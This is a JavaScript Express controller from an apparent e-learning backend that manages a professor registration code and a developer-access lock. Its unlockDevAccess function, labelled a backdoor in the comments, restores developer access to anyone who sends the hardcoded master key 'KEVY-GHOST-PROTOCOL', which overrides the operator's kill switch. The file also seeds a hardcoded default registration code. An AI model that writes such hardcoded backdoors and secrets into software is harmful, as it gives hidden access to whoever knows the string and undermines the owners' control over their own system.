// kevyamon/lokolearn_backend/LokoLearn_Backend-80d946f165c0cfa3aca77a220fc2a35a52f497cd/controllers/settingsController.js
const SystemSetting = require('../models/SystemSetting');

// 1. RÉCUPÉRER LE CODE PROF
const getProfCode = async (req, res) => {
  try {
    let setting = await SystemSetting.findOne({ key: 'PROF_REGISTRATION_CODE' });
    
    if (!setting) {
      // Création par défaut si inexistant
      setting = await SystemSetting.create({
        key: 'PROF_REGISTRATION_CODE',
        value: 'LOKO-PROF-2024',
        description: "Code requis pour l'inscription des professeurs"
      });
    }
    
    res.json({ code: setting.value });
  } catch (error) {
    res.status(500).json({ message: "Erreur récupération code." });
  }
};

// 2. METTRE À JOUR LE CODE PROF
const updateProfCode = async (req, res) => {
  const { newCode } = req.body;

  if (!newCode || newCode.length < 4) {
    return res.status(400).json({ message: "Le code est trop court." });
  }

  try {
    const setting = await SystemSetting.findOneAndUpdate(
      { key: 'PROF_REGISTRATION_CODE' },
      { value: newCode },
      { new: true, upsert: true }
    );
    res.json({ message: "Code mis à jour avec succès", code: setting.value });
  } catch (error) {
    res.status(500).json({ message: "Erreur mise à jour." });
  }
};

// 3. VERROUILLER L'ACCÈS DEV (Kill Switch)
const lockDevAccess = async (req, res) => {
  try {
    await SystemSetting.findOneAndUpdate(
      { key: 'DEV_ACCESS_LOCKED' },
      { value: 'true' },
      { new: true, upsert: true }
    );
    res.json({ message: "Accès développeur verrouillé. Le système est maintenant sous contrôle exclusif." });
  } catch (error) {
    res.status(500).json({ message: "Erreur lors du verrouillage." });
  }
};

// 4. DÉVERROUILLER L'ACCÈS DEV (Backdoor)
const unlockDevAccess = async (req, res) => {
  const { masterKey } = req.body;

  // CLÉ MAÎTRESSE DE SECOURS (À garder secrète)
  if (masterKey !== "KEVY-GHOST-PROTOCOL") { 
    return res.status(403).json({ message: "Accès refusé." });
  }

  try {
    await SystemSetting.findOneAndUpdate(
      { key: 'DEV_ACCESS_LOCKED' },
      { value: 'false' },
      { new: true, upsert: true }
    );
    res.json({ message: "Accès développeur rétabli." });
  } catch (error) {
    res.status(500).json({ message: "Erreur." });
  }
};

module.exports = { getProfCode, updateProfCode, lockDevAccess, unlockDevAccess };